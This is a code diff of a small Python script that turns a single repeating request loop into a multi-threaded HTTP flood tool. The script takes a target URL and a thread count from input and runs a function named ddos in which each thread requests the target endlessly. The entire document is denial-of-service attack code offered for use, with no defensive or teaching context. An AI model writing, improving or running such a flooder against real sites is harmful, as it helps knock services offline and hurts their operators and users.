@@ -1,6 +1,11 @@
-import requests
+import requests, threading
+url = input()
+thr = input()
+def ddos():
+    while True:
+        r = requests.get(url)
+        print(r)
 
-
-while True:
-    result = requests.get('http://cogentv2.dstat.org/')
-    print(result)
+for i in range(int(thr)):
+    thr = threading.Thread(target=ddos)
+    thr.start()
